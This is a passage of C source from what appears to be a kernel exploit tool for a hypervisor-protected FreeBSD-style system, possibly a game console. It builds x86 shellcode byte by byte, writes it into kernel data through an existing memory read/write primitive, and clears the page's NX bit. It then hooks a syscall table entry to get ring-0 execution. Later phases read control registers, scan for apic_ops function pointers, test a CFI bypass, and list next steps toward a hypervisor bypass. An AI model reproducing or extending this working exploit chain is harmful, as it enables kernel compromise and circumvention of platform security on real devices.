            printf("[*] Target: kdata_base KVA=0x%lx PA=0x%lx\n",
                   (unsigned long)target_kva, (unsigned long)target_pa);
            printf("[*] PTE at PA 0x%lx: 0x%016lx\n",
                   (unsigned long)pte_pa, (unsigned long)orig_pte);
            printf("    NX=%d RW=%d G=%d A=%d\n",
                   (int)(orig_pte >> 63), (int)((orig_pte >> 1) & 1),
                   (int)((orig_pte >> 8) & 1), (int)((orig_pte >> 5) & 1));
            fflush(stdout);

            if (!(orig_pte >> 63)) {
                printf("[!] NX already clear — page is already executable?!\n");
                goto r0_skip;
            }

            /* Step 1: Save original kdata content and write shellcode.
             *
             * Shellcode (29 bytes):
             *   mov rax, <DMAP_KVA_of_shared_buf>  ; 10 bytes
             *   mov rdx, <magic>                    ; 10 bytes
             *   mov [rax], rdx                      ; 3 bytes
             *   xor eax, eax                        ; 2 bytes
             *   ret                                 ; 1 byte
             *
             * Writes 0xDEAD_RING_0000_0000 to shared buffer, returns 0.
             */
            uint8_t r0_shellcode[32];
            int sc_len = 0;
            uint64_t sc_magic = 0xDEAD000052494E47ULL; /* "RING" + marker */

            /* mov rax, imm64 */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0xB8;
            memcpy(&r0_shellcode[sc_len], &result_kva, 8);
            sc_len += 8;

            /* mov rdx, imm64 */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0xBA;
            memcpy(&r0_shellcode[sc_len], &sc_magic, 8);
            sc_len += 8;

            /* mov [rax], rdx */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0x89;
            r0_shellcode[sc_len++] = 0x10;

            /* xor eax, eax */
            r0_shellcode[sc_len++] = 0x31;
            r0_shellcode[sc_len++] = 0xC0;

            /* ret */
            r0_shellcode[sc_len++] = 0xC3;

            printf("\n[*] Step 1: Writing %d-byte shellcode to kdata via DMAP...\n",
                   sc_len);

            /* Save original bytes */
            uint8_t r0_backup[64];
            kernel_copyout(g_dmap_base + target_pa, r0_backup, sc_len);

            /* Write shellcode */
            kernel_copyin(r0_shellcode, g_dmap_base + target_pa, sc_len);

            /* Verify */
            uint8_t r0_verify[32];
            kernel_copyout(g_dmap_base + target_pa, r0_verify, sc_len);
            int sc_match = (memcmp(r0_shellcode, r0_verify, sc_len) == 0);
            printf("    Write verify: %s\n", sc_match ? "OK" : "MISMATCH");
            printf("    Bytes: ");
            for (int i = 0; i < sc_len; i++) printf("%02x ", r0_verify[i]);
            printf("\n");
            fflush(stdout);

            if (!sc_match) {
                printf("[-] Shellcode write failed, aborting.\n");
                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
                goto r0_skip;
            }

            /* Step 2: Clear NX (bit 63) and G (bit 8) in guest PTE.
             * Clearing G ensures the TLB entry (if cached) will be
             * flushed on the next CR3 reload (context switch). */
            printf("[*] Step 2: Clearing NX+G in guest PTE...\n");
            uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
            printf("    Old PTE: 0x%016lx (NX=%d G=%d)\n",
                   (unsigned long)orig_pte,
                   (int)(orig_pte >> 63), (int)((orig_pte >> 8) & 1));
            printf("    New PTE: 0x%016lx (NX=%d G=%d)\n",
                   (unsigned long)new_pte,
                   (int)(new_pte >> 63), (int)((new_pte >> 8) & 1));

            kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

            /* Verify PTE write */
            uint64_t pte_rb;
            kernel_copyout(g_dmap_base + pte_pa, &pte_rb, 8);
            printf("    PTE readback: 0x%016lx [%s]\n",
                   (unsigned long)pte_rb,
                   pte_rb == new_pte ? "OK" : "MISMATCH");
            fflush(stdout);

            if (pte_rb != new_pte) {
                printf("[-] PTE write failed, restoring and aborting.\n");
                kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
                goto r0_skip;
            }

            /* Step 3: Clear shared buffer to detect fresh writes */
            printf("[*] Step 3: Clearing shared buffer...\n");
            uint64_t zero = 0;
            kernel_copyin(&zero, g_dmap_base + cpu_pa, 8);

            /* Step 4: Hook sysent[253] to kdata_base and call */
            printf("[*] Step 4: Hooking sysent[253] → kdata_base (0x%lx)...\n",
                   (unsigned long)target_kva);
            fflush(stdout);

            /* Save original sysent[253] */
            uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
            uint64_t s253_pa = va_to_pa_quiet(s253_kva);
            uint8_t s253_orig[SYSENT_STRIDE];
            kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE);

            /* Write target_kva into sysent[253].sy_call */
            uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
            kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);

            /* Set narg=0 */
            int32_t narg_zero = 0;
            uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
            kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

            /* Verify hook */
            uint64_t hook_rb;
            kernel_copyout(g_dmap_base + s253_call_pa, &hook_rb, 8);
            printf("    sysent[253].sy_call = 0x%lx [%s]\n",
                   (unsigned long)hook_rb,
                   hook_rb == target_kva ? "OK" : "MISMATCH");
            fflush(stdout);

            /* CALL THE HOOKED SYSCALL — this is the ring-0 moment */
            printf("[*] Calling syscall(253) — executing shellcode in ring 0...\n");
            fflush(stdout);
            errno = 0;
            long r0_ret = syscall(253);
            int r0_err = errno;
            printf("    syscall(253) returned: %ld, errno=%d\n",
                   r0_ret, r0_err);

            /* Step 5: IMMEDIATELY restore everything */
            printf("[*] Step 5: Restoring PTE, sysent, code cave...\n");

            /* Restore sysent[253] */
            kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);

            /* Restore PTE (put NX+G back) */
            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);

            /* Restore kdata content */
            kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);

            printf("    All restored.\n");
            fflush(stdout);

            /* Step 6: Check shared buffer for magic */
            uint64_t buf_check;
            kernel_copyout(g_dmap_base + cpu_pa, &buf_check, 8);
            printf("\n[*] Shared buffer value: 0x%016lx\n",
                   (unsigned long)buf_check);

            if (buf_check == sc_magic) {
                printf("[+] ============================================\n");
                printf("[+]  RING-0 CODE EXECUTION CONFIRMED!\n");
                printf("[+] ============================================\n");
                printf("[+] Shellcode wrote magic 0x%lx to shared buffer.\n",
                       (unsigned long)sc_magic);
                printf("[+] Attack chain: PTE NX-clear + sysent hook → ring 0\n");
                printf("[+] We have arbitrary kernel code execution.\n");

                /* ─── Phase 2: MSR/CR Reconnaissance via ring-0 ─── */
                printf("\n=============================================\n");
                printf("  Ring-0 Phase 2: MSR/CR Reconnaissance\n");
                printf("=============================================\n\n");
                fflush(stdout);

                /* Build the MSR recon shellcode */
                uint8_t msr_sc[512];
                int msr_sc_len = build_ring0_msr_shellcode(msr_sc, sizeof(msr_sc),
                                                           result_kva);
                printf("[*] MSR recon shellcode: %d bytes\n", msr_sc_len);

                if (msr_sc_len <= 0 || msr_sc_len > 480) {
                    printf("[-] Shellcode too large or failed to build.\n");
                } else {
                    /* Clear the shared buffer for fresh results */
                    uint8_t zero_buf[256];
                    memset(zero_buf, 0, sizeof(zero_buf));
                    for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
                        kernel_copyin(zero_buf, g_dmap_base + cpu_pa + zb, 256);

                    /* Save original kdata content (larger region for MSR shellcode) */
                    uint8_t msr_backup[512];
                    kernel_copyout(g_dmap_base + target_pa, msr_backup, msr_sc_len);

                    /* Write MSR shellcode to kdata code cave */
                    printf("[*] Writing MSR shellcode to kdata code cave...\n");
                    kernel_copyin(msr_sc, g_dmap_base + target_pa, msr_sc_len);

                    /* Verify write */
                    uint8_t msr_verify[512];
                    kernel_copyout(g_dmap_base + target_pa, msr_verify, msr_sc_len);
                    int msr_match = (memcmp(msr_sc, msr_verify, msr_sc_len) == 0);
                    printf("    Write verify: %s\n", msr_match ? "OK" : "MISMATCH");
                    fflush(stdout);

                    if (msr_match) {
                        /* Clear NX+G in PTE again */
                        printf("[*] Clearing NX+G in PTE for MSR shellcode...\n");
                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);

                        /* Hook sysent[253] again */
                        printf("[*] Hooking sysent[253] → kdata_base...\n");
                        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
                        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

                        /* Execute MSR recon in ring 0 */
                        printf("[*] Calling syscall(253) — MSR/CR recon in ring 0...\n");
                        fflush(stdout);
                        errno = 0;
                        long msr_ret = syscall(253);
                        int msr_err = errno;
                        printf("    syscall(253) returned: %ld, errno=%d\n",
                               msr_ret, msr_err);

                        /* Restore everything immediately */
                        printf("[*] Restoring PTE, sysent, code cave...\n");
                        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
                        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
                        printf("    All restored.\n");
                        fflush(stdout);

                        /* Parse results from shared buffer */
                        struct kmod_result_buf msr_results;
                        memcpy(&msr_results, result_vaddr, sizeof(msr_results));

                        if (msr_results.magic == KMOD_MAGIC &&
                            msr_results.status == KMOD_STATUS_DONE) {
                            printf("\n[+] ============================================\n");
                            printf("[+]  MSR/CR RECON COMPLETE — %u entries\n",
                                   msr_results.num_msr_results);
                            printf("[+] ============================================\n\n");

                            for (uint32_t mi = 0;
                                 mi < msr_results.num_msr_results && mi < 32;
                                 mi++) {
                                uint32_t mid = msr_results.msr_results[mi].msr_id;
                                uint64_t mval = msr_results.msr_results[mi].value;
                                const char *mname;
                                switch (mid) {
                                    case 0xC0000080: mname = "EFER"; break;
                                    case 0xC0000081: mname = "STAR"; break;
                                    case 0xC0000082: mname = "LSTAR"; break;
                                    case 0xC0000084: mname = "SFMASK"; break;
                                    case 0xC0000100: mname = "FS_BASE"; break;
                                    case 0xC0000101: mname = "GS_BASE"; break;
                                    case 0xC0000102: mname = "KGS_BASE"; break;
                                    case 0xC0000103: mname = "TSC_AUX"; break;
                                    case 0x0000001B: mname = "APIC_BASE"; break;
                                    case 0xFFFF0000: mname = "CR0"; break;
                                    case 0xFFFF0003: mname = "CR3"; break;
                                    case 0xFFFF0004: mname = "CR4"; break;
                                    default: mname = "???"; break;
                                }
                                printf("    %-12s (0x%08x) = 0x%016lx\n",
                                       mname, mid, (unsigned long)mval);

                                /* Decode important registers */
                                if (mid == 0xC0000080) { /* EFER */
                                    printf("      SCE=%d LME=%d LMA=%d NXE=%d SVME=%d "
                                           "LMSLE=%d FFXSR=%d TCE=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 8) & 1),
                                           (int)((mval >> 10) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 12) & 1),
                                           (int)((mval >> 13) & 1),
                                           (int)((mval >> 14) & 1),
                                           (int)((mval >> 15) & 1));
                                    if (mval & (1ULL << 12))
                                        printf("      [!] SVME=1 — SVM enabled in guest!\n");
                                    else
                                        printf("      [*] SVME=0 — SVM disabled (expected in guest)\n");
                                }
                                if (mid == 0xC0000082) { /* LSTAR */
                                    printf("      Syscall entry point (ring 0)\n");
                                    if (g_ktext_base && mval >= g_ktext_base &&
                                        mval < g_ktext_base + 0x1000000)
                                        printf("      ktext offset: +0x%lx\n",
                                               (unsigned long)(mval - g_ktext_base));
                                }
                                if (mid == 0x1B) { /* APIC_BASE */
                                    printf("      APIC PA=0x%lx BSP=%d EN=%d EXTD=%d\n",
                                           (unsigned long)(mval & 0xFFFFF000ULL),
                                           (int)((mval >> 8) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 10) & 1));
                                }
                                if (mid == 0xFFFF0000) { /* CR0 */
                                    printf("      PE=%d MP=%d EM=%d TS=%d ET=%d "
                                           "NE=%d WP=%d AM=%d NW=%d CD=%d PG=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 1) & 1),
                                           (int)((mval >> 2) & 1),
                                           (int)((mval >> 3) & 1),
                                           (int)((mval >> 4) & 1),
                                           (int)((mval >> 5) & 1),
                                           (int)((mval >> 16) & 1),
                                           (int)((mval >> 18) & 1),
                                           (int)((mval >> 29) & 1),
                                           (int)((mval >> 30) & 1),
                                           (int)((mval >> 31) & 1));
                                }
                                if (mid == 0xFFFF0004) { /* CR4 */
                                    printf("      VME=%d PVI=%d TSD=%d DE=%d "
                                           "PSE=%d PAE=%d MCE=%d PGE=%d\n",
                                           (int)(mval & 1),
                                           (int)((mval >> 1) & 1),
                                           (int)((mval >> 2) & 1),
                                           (int)((mval >> 3) & 1),
                                           (int)((mval >> 4) & 1),
                                           (int)((mval >> 5) & 1),
                                           (int)((mval >> 6) & 1),
                                           (int)((mval >> 7) & 1));
                                    printf("      OSFXSR=%d OSXMMEX=%d UMIP=%d "
                                           "FSGSBASE=%d PCIDE=%d OSXSAVE=%d SMEP=%d SMAP=%d\n",
                                           (int)((mval >> 9) & 1),
                                           (int)((mval >> 10) & 1),
                                           (int)((mval >> 11) & 1),
                                           (int)((mval >> 16) & 1),
                                           (int)((mval >> 17) & 1),
                                           (int)((mval >> 18) & 1),
                                           (int)((mval >> 20) & 1),
                                           (int)((mval >> 21) & 1));
                                }
                            }
                            printf("\n");
                        } else if (msr_results.magic == KMOD_MAGIC) {
                            printf("[?] MSR recon started but didn't complete "
                                   "(status=%u)\n", msr_results.status);
                            printf("    Likely #GP on an MSR read — HV intercept.\n");
                        } else {
                            printf("[-] MSR shellcode did not write magic.\n");
                            if (msr_err != 0)
                                printf("    errno=%d — possible #GP fault.\n", msr_err);
                        }
                    } else {
                        /* Write failed — restore kdata */
                        printf("[-] MSR shellcode write verify failed.\n");
                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
                    }
                }

                /* ─── Phase 3: Scan kdata for apic_ops vtable ─── */
                printf("=============================================\n");
                printf("  Ring-0 Phase 3: APIC Ops Discovery\n");
                printf("=============================================\n\n");
                printf("[*] Scanning kdata for function pointer tables (apic_ops)...\n");
                printf("[*] Looking for clusters of 4+ consecutive ktext pointers.\n");
                printf("    ktext range: 0x%lx — 0x%lx\n",
                       (unsigned long)g_ktext_base,
                       (unsigned long)(g_ktext_base + 0xA00000));
                printf("    kdata range: 0x%lx — 0x%lx\n",
                       (unsigned long)g_kdata_base,
                       (unsigned long)(g_kdata_base + 0x200000));
                fflush(stdout);

                /*
                 * Strategy: Read kdata in 4KB chunks via kernel_copyout.
                 * For each 8-byte-aligned qword, check if it's in ktext range.
                 * Track runs of consecutive ktext pointers.
                 * apic_ops should have ~20+ function pointers.
                 */
                #define APIC_SCAN_SIZE   0x200000  /* 2MB of kdata */
                #define APIC_SCAN_CHUNK  0x1000    /* 4KB at a time */
                #define APIC_MIN_RUN     4         /* Minimum consecutive ptrs */

                int apic_found_tables = 0;
                int apic_run_len = 0;
                uint64_t apic_run_start = 0;
                uint64_t apic_best_addr = 0;
                int apic_best_len = 0;

                uint8_t apic_chunk[APIC_SCAN_CHUNK];

                for (uint64_t off = 0; off < APIC_SCAN_SIZE;
                     off += APIC_SCAN_CHUNK) {
                    uint64_t scan_kva = g_kdata_base + off;
                    uint64_t scan_pa = va_to_pa_quiet(scan_kva);
                    if (scan_pa == 0) {
                        /* Page not mapped — reset run */
                        if (apic_run_len >= APIC_MIN_RUN) {
                            printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                                   (unsigned long)(apic_run_start - g_kdata_base),
                                   apic_run_len);
                            if (apic_run_len > apic_best_len) {
                                apic_best_len = apic_run_len;
                                apic_best_addr = apic_run_start;
                            }
                            apic_found_tables++;
                        }
                        apic_run_len = 0;
                        continue;
                    }

                    kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
                                   APIC_SCAN_CHUNK);

                    for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
                        uint64_t qval;
                        memcpy(&qval, &apic_chunk[qi], 8);

                        int is_ktext_ptr =
                            (qval >= g_ktext_base &&
                             qval < g_ktext_base + 0xA00000 &&
                             (qval & 0xF) == 0);  /* aligned */

                        if (is_ktext_ptr) {
                            if (apic_run_len == 0)
                                apic_run_start = scan_kva + qi;
                            apic_run_len++;
                        } else {
                            if (apic_run_len >= APIC_MIN_RUN) {
                                printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                                       (unsigned long)(apic_run_start - g_kdata_base),
                                       apic_run_len);
                                if (apic_run_len > apic_best_len) {
                                    apic_best_len = apic_run_len;
                                    apic_best_addr = apic_run_start;
                                }
                                apic_found_tables++;
                            }
                            apic_run_len = 0;
                        }
                    }
                }
                /* Flush final run */
                if (apic_run_len >= APIC_MIN_RUN) {
                    printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
                           (unsigned long)(apic_run_start - g_kdata_base),
                           apic_run_len);
                    if (apic_run_len > apic_best_len) {
                        apic_best_len = apic_run_len;
                        apic_best_addr = apic_run_start;
                    }
                    apic_found_tables++;
                }

                printf("\n[*] Found %d function pointer tables.\n",
                       apic_found_tables);

                if (apic_best_addr) {
                    printf("[+] Largest table: kdata+0x%lx (%d entries)\n",
                           (unsigned long)(apic_best_addr - g_kdata_base),
                           apic_best_len);
                    printf("[*] Dumping entries:\n");
                    /* Dump the best candidate */
                    uint64_t dump_pa = va_to_pa_quiet(apic_best_addr);
                    if (dump_pa) {
                        int dump_cnt = apic_best_len;
                        if (dump_cnt > 32) dump_cnt = 32;
                        uint64_t dump_buf[32];
                        kernel_copyout(g_dmap_base + dump_pa,
                                       dump_buf, dump_cnt * 8);
                        for (int di = 0; di < dump_cnt; di++) {
                            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
                                   di, (unsigned long)dump_buf[di],
                                   (unsigned long)(dump_buf[di] - g_ktext_base));
                        }
                    }
                }

                /* Look specifically for tables with ~20-30 entries (apic_ops size) */
                if (apic_found_tables > 0) {
                    printf("\n[*] Candidate apic_ops tables (15-40 entries):\n");
                    int apic_cand = 0;
                    apic_run_len = 0;
                    apic_run_start = 0;

                    for (uint64_t off = 0; off < APIC_SCAN_SIZE;
                         off += APIC_SCAN_CHUNK) {
                        uint64_t scan_kva = g_kdata_base + off;
                        uint64_t scan_pa = va_to_pa_quiet(scan_kva);
                        if (scan_pa == 0) {
                            if (apic_run_len >= 15 && apic_run_len <= 40) {
                                printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
                                       (unsigned long)(apic_run_start - g_kdata_base),
                                       apic_run_len);
                                apic_cand++;
                            }
                            apic_run_len = 0;
                            continue;
                        }
                        kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
                                       APIC_SCAN_CHUNK);
                        for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
                            uint64_t qval;
                            memcpy(&qval, &apic_chunk[qi], 8);
                            int is_ktext_ptr =
                                (qval >= g_ktext_base &&
                                 qval < g_ktext_base + 0xA00000 &&
                                 (qval & 0xF) == 0);
                            if (is_ktext_ptr) {
                                if (apic_run_len == 0)
                                    apic_run_start = scan_kva + qi;
                                apic_run_len++;
                            } else {
                                if (apic_run_len >= 15 && apic_run_len <= 40) {
                                    printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
                                           (unsigned long)(apic_run_start - g_kdata_base),
                                           apic_run_len);
                                    apic_cand++;
                                }
                                apic_run_len = 0;
                            }
                        }
                    }
                    if (apic_run_len >= 15 && apic_run_len <= 40) {
                        printf("    CANDIDATE at kdata+0x%lx: %d ptrs\n",
                               (unsigned long)(apic_run_start - g_kdata_base),
                               apic_run_len);
                        apic_cand++;
                    }
                    if (apic_cand == 0)
                        printf("    (none in 15-40 range)\n");
                }

                printf("\n");
                fflush(stdout);

                /* ─── Phase 4: VMMCALL analysis (NO direct probe) ─── */
                /*
                 * DISABLED: Direct VMMCALL probe causes kernel panic.
                 *
                 * The HV intercepts VMMCALL (#VMEXIT) and injects #UD or #GP
                 * back into the guest for unrecognized hypercall numbers.
                 * Without a proper IDT-based fault handler installed first,
                 * any fault in kernel mode → kernel panic.
                 *
                 * Safe VMMCALL probing requires:
                 *   1. Install custom #UD/#GP handlers in IDT (vectors 6, 13)
                 *   2. Set up a recovery trampoline (longjmp-style)
                 *   3. Only then issue VMMCALL
                 *   4. If fault fires, handler recovers; if not, VMMCALL survived
                 *
                 * Alternative: Use the apic_ops suspend/resume path (flatz method)
                 * which executes VMMCALL during a window where the HV is inactive.
                 */
                printf("=============================================\n");
                printf("  Ring-0 Phase 4: VMMCALL Analysis\n");
                printf("=============================================\n\n");
                printf("[*] EFER.SVME=1 confirmed — system runs under AMD SVM HV.\n");
                printf("[!] Direct VMMCALL probe SKIPPED (causes kernel panic).\n");
                printf("    HV injects #UD/#GP for unknown hypercalls.\n");
                printf("    Need IDT fault handler before safe probing.\n\n");
                printf("[*] Safe VMMCALL strategy (TODO):\n");
                printf("    1. Hook IDT vector 6 (#UD) and 13 (#GP)\n");
                printf("    2. Install recovery trampoline in handlers\n");
                printf("    3. Issue VMMCALL with RAX=0..31\n");
                printf("    4. If handler fires → HV rejected; if returns → survived\n\n");
                printf("[*] Alternative: apic_ops suspend/resume path (flatz method)\n");
                printf("    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)\n");
                printf("    with ROP gadget, trigger suspend/resume cycle.\n");
                printf("    Code runs before HV restarts → bypass intercepts.\n");
                if (apic_best_addr) {
                    printf("[+] Candidate apic_ops found at 0x%lx\n",
                           (unsigned long)apic_best_addr);
                    printf("    xapic_mode would be at 0x%lx (offset +0x10)\n",
                           (unsigned long)(apic_best_addr + 0x10));
                }
                printf("\n");
                fflush(stdout);

                /* ─── Phase 5: Ring-0 apic_ops Direct Write Test ─── */
                /*
                 * Build shellcode that:
                 *   1. Reads apic_ops[2] (xapic_mode) directly
                 *   2. Writes the same value back (direct mov — NO CFI)
                 *   3. Reads it back and stores results
                 *
                 * If the write doesn't #GP, we've proved ring-0 stores
                 * bypass CFI on function pointer tables.
                 *
                 * Shellcode layout:
                 *   mov rdi, output_kva
                 *   mov rsi, apic_ops_xapic_kva
                 *   mov rax, [rsi]          ; read original xapic_mode
                 *   mov [rdi], rax           ; store original to result[0]
                 *   mov [rsi], rax           ; SAME-VALUE WRITEBACK (CFI test!)
                 *   mov rax, [rsi]           ; read back
                 *   mov [rdi+8], rax         ; store readback to result[1]
                 *   mov rax, [rsi-0x10]      ; read apic_ops[0] (create)
                 *   mov [rdi+16], rax        ; alt ptr candidate
                 *   mov rax, 0xDEAD_APIC_0000_0001  ; survived magic
                 *   mov [rdi+24], rax
                 *   xor eax, eax
                 *   ret
                 */
                if (apic_best_addr) {
                    printf("=============================================\n");
                    printf("  Ring-0 Phase 5: apic_ops Direct Write Test\n");
                    printf("=============================================\n\n");
                    fflush(stdout);

                    uint64_t xapic_kva = apic_best_addr + 0x10; /* slot [2] */
                    printf("[*] Target: xapic_mode at 0x%lx\n",
                           (unsigned long)xapic_kva);

                    /* Build the apic_ops test shellcode */
                    uint8_t apic_sc[256];
                    int ap = 0;
                    #define APIC_EMIT(b) do { if (ap < 256) apic_sc[ap++] = (uint8_t)(b); } while(0)
                    #define APIC_EMIT_U64(v) do { uint64_t _v=(v); memcpy(&apic_sc[ap],&_v,8); ap+=8; } while(0)

                    /* mov rdi, output_kva (result buffer) */
                    APIC_EMIT(0x48); APIC_EMIT(0xBF); APIC_EMIT_U64(result_kva);

                    /* mov rsi, xapic_kva (apic_ops[2] address) */
                    APIC_EMIT(0x48); APIC_EMIT(0xBE); APIC_EMIT_U64(xapic_kva);

                    /* mov rax, [rsi]  -- read original xapic_mode */
                    APIC_EMIT(0x48); APIC_EMIT(0x8B); APIC_EMIT(0x06);

                    /* mov [rdi], rax  -- store original to result[0] */
                    APIC_EMIT(0x48); APIC_EMIT(0x89); APIC_EMIT(0x07);

                    /* ═══ THE CRITICAL TEST ═══ */
                    /* mov [rsi], rax  -- SAME-VALUE WRITEBACK to apic_ops! */
                    APIC_EMIT(0x48); APIC_EMIT(0x89); APIC_EMIT(0x06);

                    /* mov rax, [rsi]  -- read back after write */
                    APIC_EMIT(0x48); APIC_EMIT(0x8B); APIC_EMIT(0x06);

                    /* mov [rdi+8], rax -- store readback to result[1] */
                    APIC_EMIT(0x48); APIC_EMIT(0x89); APIC_EMIT(0x47); APIC_EMIT(0x08);

                    /* mov rax, [rsi-0x10]  -- read apic_ops[0] for cross-check */
                    APIC_EMIT(0x48); APIC_EMIT(0x8B); APIC_EMIT(0x46); APIC_EMIT(0xF0);

                    /* mov [rdi+16], rax -- store to result[2] */
                    APIC_EMIT(0x48); APIC_EMIT(0x89); APIC_EMIT(0x47); APIC_EMIT(0x10);

                    /* mov rax, 0xDEADAP1C00000001 -- survived magic */
                    APIC_EMIT(0x48); APIC_EMIT(0xB8);
                    APIC_EMIT_U64(0xDEADA91C00000001ULL);

                    /* mov [rdi+24], rax */
                    APIC_EMIT(0x48); APIC_EMIT(0x89); APIC_EMIT(0x47); APIC_EMIT(0x18);

                    /* xor eax, eax; ret */
                    APIC_EMIT(0x31); APIC_EMIT(0xC0);
                    APIC_EMIT(0xC3);

                    #undef APIC_EMIT
                    #undef APIC_EMIT_U64

                    printf("[*] apic_ops test shellcode: %d bytes\n", ap);

                    /* Clear shared buffer */
                    uint8_t zbuf[256];
                    memset(zbuf, 0, sizeof(zbuf));
                    for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
                        kernel_copyin(zbuf, g_dmap_base + cpu_pa + zb, 256);

                    /* Save/write/clear-NX/hook/call cycle */
                    uint8_t apic_backup[256];
                    kernel_copyout(g_dmap_base + target_pa, apic_backup, ap);
                    kernel_copyin(apic_sc, g_dmap_base + target_pa, ap);

                    uint8_t apic_verify[256];
                    kernel_copyout(g_dmap_base + target_pa, apic_verify, ap);
                    int apic_sc_match = (memcmp(apic_sc, apic_verify, ap) == 0);
                    printf("[*] Shellcode write verify: %s\n",
                           apic_sc_match ? "OK" : "MISMATCH");

                    if (apic_sc_match) {
                        /* Clear NX+G in PTE */
                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
                        /* Hook sysent[253] */
                        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
                        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);

                        printf("[*] Calling syscall(253) — apic_ops write test in ring 0...\n");
                        fflush(stdout);
                        errno = 0;
                        long apic_ret = syscall(253);
                        int apic_err = errno;
                        printf("    syscall(253) returned: %ld, errno=%d\n",
                               apic_ret, apic_err);

                        /* Restore everything */
                        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
                        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
                        kernel_copyin(apic_backup, g_dmap_base + target_pa, ap);
                        printf("    All restored.\n");
                        fflush(stdout);

                        /* Parse results from shared buffer */
                        uint64_t apic_results[4];
                        memcpy(apic_results, result_vaddr, sizeof(apic_results));

                        uint64_t apic_orig = apic_results[0];
                        uint64_t apic_rb   = apic_results[1];
                        uint64_t apic_alt  = apic_results[2];
                        uint64_t apic_magic = apic_results[3];

                        printf("\n[*] Results:\n");
                        printf("    Original xapic_mode: 0x%016lx\n",
                               (unsigned long)apic_orig);
                        printf("    After writeback:     0x%016lx\n",
                               (unsigned long)apic_rb);
                        printf("    apic_ops[0] (create): 0x%016lx\n",
                               (unsigned long)apic_alt);
                        printf("    Survived magic:      0x%016lx\n",
                               (unsigned long)apic_magic);

                        if (apic_magic == 0xDEADA91C00000001ULL) {
                            printf("\n[+] ============================================\n");
                            printf("[+]  APIC_OPS SAME-VALUE WRITEBACK SURVIVED!\n");
                            printf("[+]  Ring-0 direct store BYPASSES CFI!\n");
                            printf("[+] ============================================\n");
                            if (apic_rb == apic_orig) {
                                printf("[+] Value unchanged after writeback (correct).\n");
                            } else {
                                printf("[!] Value changed after writeback! (unexpected)\n");
                            }
                            printf("[+] This proves: CFI is software-only.\n");
                            printf("[+] Ring-0 code without CFI instrumentation can\n");
                            printf("[+] modify apic_ops function pointers freely.\n");
                            printf("\n[+] Next steps:\n");
                            printf("    1. Write ROP pivot address to xapic_mode\n");
                            printf("    2. Trigger APIC operation (suspend/resume)\n");
                            printf("    3. Gain execution before HV restarts\n");
                        } else {
                            printf("\n[-] Shellcode did not complete.\n");
                            if (apic_err != 0)
                                printf("    errno=%d — likely #GP or kernel panic.\n", apic_err);
                            printf("    CFI may be enforced at hardware/HV level.\n");
                        }
                    } else {
                        printf("[-] Shellcode write failed, skipping test.\n");
                        kernel_copyin(apic_backup, g_dmap_base + target_pa, ap);
                    }
                    printf("\n");
                    fflush(stdout);
                }
            } else if (buf_check != 0) {
                printf("[?] Buffer has unexpected value: 0x%lx\n",
                       (unsigned long)buf_check);
                printf("    Partial execution or different code path.\n");
            } else {
                printf("[-] Buffer still zero — shellcode did not execute.\n");
                if (r0_err != 0) {
                    printf("    errno=%d suggests a fault occurred.\n", r0_err);
                    printf("    Likely: stale TLB entry with NX=1.\n");
                    printf("    Need: invlpg or CR4.PGE toggle to flush.\n");
                } else {
                    printf("    But no error either — investigate.\n");
                }
            }
            printf("\n");
            fflush(stdout);
        }

r0_skip: ;

idt_done: ;
idt_skip: ;
    }

    if (results->magic != KMOD_MAGIC) {
        printf("[-] Result buffer magic mismatch: expected 0x%llx, got 0x%llx\n",
               (unsigned long long)KMOD_MAGIC, (unsigned long long)results->magic);

        if (first_qword == 0xAAAABBBBCCCCDDDDULL) {
            printf("[!] Pre-campaign CANARY found! hv_init() DID execute.\n");
            printf("    g_output_kva is correct, but campaign or copy crashed.\n");
